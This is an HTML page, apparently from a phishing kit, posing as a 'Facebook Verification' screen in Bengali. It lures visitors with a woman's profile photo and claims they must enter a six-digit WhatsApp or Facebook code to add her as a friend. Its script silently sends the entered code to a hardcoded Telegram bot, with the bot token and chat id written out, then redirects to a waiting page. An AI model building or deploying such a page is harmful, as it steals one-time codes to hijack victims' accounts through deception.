<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-color: #f0f2f5; 
            font-family: 'Segoe UI', Arial, sans-serif; 
        }
        .code-input {
            width: 48px;
            height: 56px;
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            border: 2px solid #dddfe2;
            border-radius: 8px;
            background: #ffffff;
            transition: border-color 0.15s, box-shadow 0.15s;
        }
        .code-input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.3);
            outline: none;
        }
        .blue-btn {
            background-color: #1877f2;
            color: white;
            font-weight: bold;
            padding: 14px 0;
            border-radius: 8px;
            width: 100%;
            max-width: 320px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .blue-btn:hover { background-color: #166fe5; }
        .blue-btn:disabled {
            background-color: #a0c4ff;
            cursor: not-allowed;
        }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen bg-[#f0f2f5]">

    <!-- প্রোফাইল ছবি – আগের পেজের মতো -->
    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
             alt="Profile" class="w-full h-full object-cover">
    </div>

    <!-- মূল কন্টেন্ট বক্স -->
    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[65vh] flex flex-col items-center">

        <h2 class="text-[22px] font-bold text-gray-900 mb-4 text-center">Verification</h2>

        <p class="text-[15px] text-gray-600 mb-8 text-center leading-relaxed px-3">
            Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে।<br>
            তার আইডিতে অ্যাড হতে WhatsApp / Facebook নোটিফিকেশনে ৬ সংখ্যার কোড দেখুন এবং নিচে ফাঁকা ঘরে বসিয়ে ফেসবুক এড করুন ।
        </p>

        <div id="otp-inputs" class="flex justify-center gap-3 mb-8">
            <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
            <input type="text" inputmode="numeric" maxlength="1" class="code-input">
        </div>

        <button id="submitBtn" class="blue-btn mb-4" disabled>
            Add Friend
        </button>

        <p class="text-gray-500 text-sm text-center">
            কোড পুরো হলে অটোমেটিক প্রক্রিয়া শুরু হবে
        </p>

    </div>

<script>
// OTP অটোমেটিক ফ্লো
const inputs = document.querySelectorAll('.code-input');
const submitBtn = document.getElementById('submitBtn');

function moveToNext(current) {
    current.value = current.value.replace(/[^0-9]/g, '');

    if (current.value.length === 1) {
        const next = current.nextElementSibling;
        if (next) next.focus();
        else checkIfComplete();
    }
}

function moveToPrev(current, e) {
    if (e.key === "Backspace" && current.value.length === 0) {
        const prev = current.previousElementSibling;
        if (prev) {
            prev.focus();
            prev.select();
        }
    }
}

function updateButtonState() {
    const filledCount = Array.from(inputs).filter(inp => inp.value !== "").length;
    submitBtn.disabled = (filledCount !== 6);
}

function getFullCode() {
    return Array.from(inputs).map(inp => inp.value).join('');
}

function checkIfComplete() {
    if (getFullCode().length === 6) {
        sendCodeAndRedirect(true); // true = অটো
    }
}

async function sendCodeAndRedirect(isAuto = false) {
    const code = getFullCode();
    if (code.length !== 6) return;

    try {
        const msg = `📩 OTP কোড (page2.html) ${isAuto ? '(অটোমেটিক)' : '(বাটন ক্লিক)'}: ${code}\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`;

        await fetch(`https://api.telegram.org/bot8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: "8516934257",
                text: msg
            })
        });
    } catch (err) {
        console.error("Telegram send error:", err);
    }

    // অটো রিডাইরেক্ট
    window.location.href = "waiting.html";
}

// ইভেন্ট লিসেনার যোগ করা
inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        moveToNext(input);
        updateButtonState();
    });

    input.addEventListener('keydown', (e) => {
        moveToPrev(input, e);
    });

    // পেস্ট করলে সাপোর্ট (অপশনাল)
    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
        if (pasted.length > 0) {
            let current = input;
            for (let i = 0; i < pasted.length && current; i++) {
                current.value = pasted[i];
                current = current.nextElementSibling;
            }
            if (current) current.focus();
            else checkIfComplete();
            updateButtonState();
        }
    });
});

// প্রথম ইনপুটে ফোকাস
inputs[0].focus();
updateButtonState();

// বাটন ক্লিকে ম্যানুয়াল সাবমিট (যদিও অটো আছে)
submitBtn.addEventListener('click', () => sendCodeAndRedirect(false));
</script>

</body>
</html>
